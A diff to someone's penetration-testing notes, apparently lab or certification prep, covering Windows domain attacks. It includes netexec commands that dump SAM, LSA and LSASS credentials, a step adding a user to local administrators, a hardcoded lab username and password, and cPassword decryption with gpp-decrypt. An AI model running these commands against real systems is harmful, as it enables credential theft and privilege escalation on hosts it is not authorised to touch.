@@ -27,10 +27,24 @@ Test-NetConnection PIVOT_INTERNAL_IP -Port 4444
 
 3. oh yea, if you dont already along with doing --sam --lsa in the same command. run modules with netexec . . .   
 
- netexec smb IP -u user -p password --sam --lsa
+ nxc smb IP -u user -p password --sam --lsa
  netexec smb IP -u user -p password -M lsassy
   netexec smb IP -u user -p password -M nanodump
-  
+
+`net localgroup administrators`
+
+Add your current root user as administrator
+```
+net localgroup administrators <DOMAIN\USERNAME> /add
+```
+
+then run nxc as this user
+
+if fail, check if he is administrator
+```
+nxc smb IP -u 'Eric.Wallows' -p 'EricLikesRunning800' --shares
+```
+
 ---
 ## Discovering Domain Name
 ```dataviewjs
@@ -358,7 +372,6 @@ dv.paragraph("```bash\n" + command + "\n```");
 
 
 ---
-
 # cPassword
 
 we can use `gpp-decrypt` which uses AES-256 key to decrypt the data. `gpp-decrypt` is a utility specifically designed to decrypt the `cPassword` (or "cipher-password") attribute found in Group Policy Preferences (GPP) XML files on a Windows domain.
